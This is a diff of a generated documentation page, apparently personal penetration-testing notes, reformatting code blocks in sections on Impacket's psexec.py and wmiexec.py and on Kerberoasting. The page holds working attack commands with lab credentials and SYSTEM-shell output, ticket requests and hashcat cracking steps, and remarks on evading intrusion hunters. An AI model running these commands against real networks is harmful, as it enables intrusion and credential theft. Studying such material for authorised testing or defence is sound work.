@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17117,34 +17140,52 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </ul>
 <h2 id="psexecpy">PSExec.py</h2>
 <p>Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the <code>ADMIN$</code> share on the target host. It then registers the service via <code>RPC</code> and the <code>Windows Service Control Manager</code>. Once established, communication happens over a named pipe, providing an interactive remote shell as <code>SYSTEM</code> on the victim host.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="gp"># </span>Get<span class="w"> </span><span class="nb">help</span><span class="w"> </span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="go">impacket-psexec -h</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="gp"># </span>Connect<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>remote<span class="w"> </span>machine<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span><span class="nb">local</span><span class="w"> </span>administrator<span class="w"> </span>account
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="go">psexec.py $domain/$user:$password@$ip </span>
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="gp"># </span>Another<span class="w"> </span>way
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="go">impacket-psexec administrator:&#39;&lt;password&gt;&#39;@$ip</span>
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="gp"># </span>Examples:
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="gp"># </span>psexec.py<span class="w"> </span>inlanefreight.local/wley:<span class="s1">&#39;transporter@4&#39;</span>@172.16.5.130
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="gp"># </span>impacket-psexec<span class="w"> </span>inlanefreight.local/wley:<span class="s1">&#39;transporter@4&#39;</span>@172.16.5.130
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># Results
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>C:\Windows\system32&gt;whoami
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>nt authority\system
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="gp"># </span>Get<span class="w"> </span><span class="nb">help</span><span class="w"> </span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="go">impacket-psexec -h</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="gp"># </span>Connect<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>remote<span class="w"> </span>machine<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span><span class="nb">local</span><span class="w"> </span>administrator<span class="w"> </span>account
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="go">psexec.py $domain/$user:$password@$ip </span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="gp"># </span>Another<span class="w"> </span>way
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="go">impacket-psexec administrator:&#39;&lt;password&gt;&#39;@$ip</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="gp"># </span>Examples:
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="gp"># </span>psexec.py<span class="w"> </span>inlanefreight.local/wley:<span class="s1">&#39;transporter@4&#39;</span>@172.16.5.130
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="gp"># </span>impacket-psexec<span class="w"> </span>inlanefreight.local/wley:<span class="s1">&#39;transporter@4&#39;</span>@172.16.5.130
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a># Results
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>C:\Windows\system32&gt;whoami
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>nt authority\system
+</span></code></pre></div></td></tr></table></div>
 <h2 id="wmiexecpy">wmiexec.py</h2>
 <p>Wmiexec.py utilizes a semi-interactive shell where commands are executed through <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page">Windows Management Instrumentation</a>. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands).</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="gp"># </span>Connect<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>remote<span class="w"> </span>machine<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span><span class="nb">local</span><span class="w"> </span>administrator<span class="w"> </span>account
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="go">wmiexec.py $domain/$user:$password@$ip </span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="gp"># </span>Examples:
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="gp"># </span>impacket-wmiexec<span class="w"> </span>inlanefreight.local/wley:<span class="s1">&#39;transporter@4&#39;</span>@172.16.5.5<span class="w"> </span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="gp"># </span>wmiexec.py<span class="w"> </span>inlanefreight.local/wley:<span class="s1">&#39;transporter@4&#39;</span>@172.16.5.5
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a># Results
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>C:&gt;whoami
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>domain\user22
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span>
+<span class="normal"><a href="#__codelineno-2-4">4</a></span>
+<span class="normal"><a href="#__codelineno-2-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="gp"># </span>Connect<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>remote<span class="w"> </span>machine<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span><span class="nb">local</span><span class="w"> </span>administrator<span class="w"> </span>account
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="go">wmiexec.py $domain/$user:$password@$ip </span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="gp"># </span>Examples:
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="gp"># </span>impacket-wmiexec<span class="w"> </span>inlanefreight.local/wley:<span class="s1">&#39;transporter@4&#39;</span>@172.16.5.5<span class="w"> </span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="gp"># </span>wmiexec.py<span class="w"> </span>inlanefreight.local/wley:<span class="s1">&#39;transporter@4&#39;</span>@172.16.5.5
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a># Results
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>C:&gt;whoami
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>domain\user22
+</span></code></pre></div></td></tr></table></div>
 <h2 id="kerberoasting">Kerberoasting</h2>
 <p><a href="../kerberos-authentication/">See about Kerberos authentication</a>.</p>
 <p>Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. </p>
@@ -17172,30 +17213,40 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h4 id="getuserspnspy">GetUserSPNs.py</h4>
 <p><a href="../impacket-GetUserSPNs/">More about GetUserSPNs.py</a>.</p>
 <p><strong>1</strong>. Install Impacket from: <a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/fortra/impacket
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">cd</span><span class="w"> </span>impacket
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>.
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/fortra/impacket
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="nb">cd</span><span class="w"> </span>impacket
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>.
+</span></code></pre></div></td></tr></table></div>
 <p><strong>2.</strong> Gather a listing of SPNs in the domain. We will need a set of valid domain credentials and the IP address of a Domain Controller.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$username</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># -dc-ip: Domain controller IP.</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1"># Example:</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$username</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="c1"># -dc-ip: Domain controller IP.</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="c1"># Example:</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="c1"># GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>3.</strong> Requesting all TGS Tickets:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$username</span><span class="w"> </span>-request<span class="w"> </span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c1"># Example:</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$username</span><span class="w"> </span>-request<span class="w"> </span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="c1"># Example:</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="c1"># GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request </span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>4.</strong> Or request just the TGS ticket for a specific account. </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$username</span><span class="w"> </span>-request-user<span class="w"> </span><span class="nv">$userrequested</span><span class="w"> </span>-outputfile<span class="w"> </span>file_tgs
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="c1"># -outputfile:  to write the TGS tickets to a file </span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c1"># Example:</span>
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$username</span><span class="w"> </span>-request-user<span class="w"> </span><span class="nv">$userrequested</span><span class="w"> </span>-outputfile<span class="w"> </span>file_tgs
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="c1"># -outputfile:  to write the TGS tickets to a file </span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="c1"># Example:</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="c1"># GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>5.</strong> Cracking the Ticket Offline with Hashcat.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>file_tgs<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>file_tgs<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <h4 id="targetedkerberoast">targetedKerberoast</h4>
 <p><a href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast</a> is a Python script that can, like many others (e.g. GetUserSPNs.py), print "kerberoast" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the "kerberoast" hash, and delete the temporary SPN set for that operation. This is called targeted Kerberoasting. This tool can be used against all users of a domain, or supplied in a list, or one user supplied in the CLI.</p>
 
@@ -17273,7 +17324,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
